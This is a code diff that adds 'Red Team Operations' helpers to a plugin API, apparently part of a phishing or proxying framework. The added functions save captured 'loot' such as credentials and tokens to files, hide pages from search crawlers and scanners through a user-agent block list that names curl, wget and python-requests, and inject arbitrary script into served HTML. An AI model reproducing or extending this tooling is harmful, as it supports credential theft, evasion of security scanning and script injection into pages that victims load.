@@ -223,6 +223,58 @@ class PluginAPI:
         except Exception as e:
             self.logger.error(f"Failed to unregister endpoint for plugin {plugin_id}: {e}")
             return False
+
+    # --- Red Team Operations ---
+
+    def log_loot(self, plugin_id: str, loot_type: str, content: Any) -> bool:
+        """Log captured loot (creds, tokens, etc)"""
+        try:
+            loot_dir = os.path.join("loot", plugin_id)
+            os.makedirs(loot_dir, exist_ok=True)
+            
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"{loot_type}_{timestamp}.json"
+            file_path = os.path.join(loot_dir, filename)
+            
+            with open(file_path, 'w') as f:
+                if isinstance(content, (dict, list)):
+                    json.dump(content, f, indent=2, default=str)
+                else:
+                    f.write(str(content))
+            
+            self.logger.info(f"Loot saved: {file_path}")
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Failed to log loot: {e}")
+            return False
+
+    def is_bot(self, user_agent: str, ip: str) -> bool:
+        """Check if request is from a bot/scanner (Basic check)"""
+        bots = ["googlebot", "bingbot", "yandex", "slurp", "baidu", "curl", "wget", "python-requests"]
+        ua_lower = user_agent.lower()
+        
+        if any(bot in ua_lower for bot in bots):
+            return True
+            
+        # TODO: Add IP reputation check here
+        return False
+
+    def inject_script(self, html_content: str, script_src: str = None, script_content: str = None) -> str:
+        """Inject JS into HTML body"""
+        if not html_content:
+            return html_content
+            
+        injection = ""
+        if script_src:
+            injection += f'<script src="{script_src}"></script>'
+        if script_content:
+            injection += f'<script>{script_content}</script>'
+            
+        if "</body>" in html_content:
+            return html_content.replace("</body>", f"{injection}</body>")
+        else:
+            return html_content + injection
     
     async def execute_hook(self, hook_name: str, *args, **kwargs) -> List[Any]:
         """Execute plugin hook"""
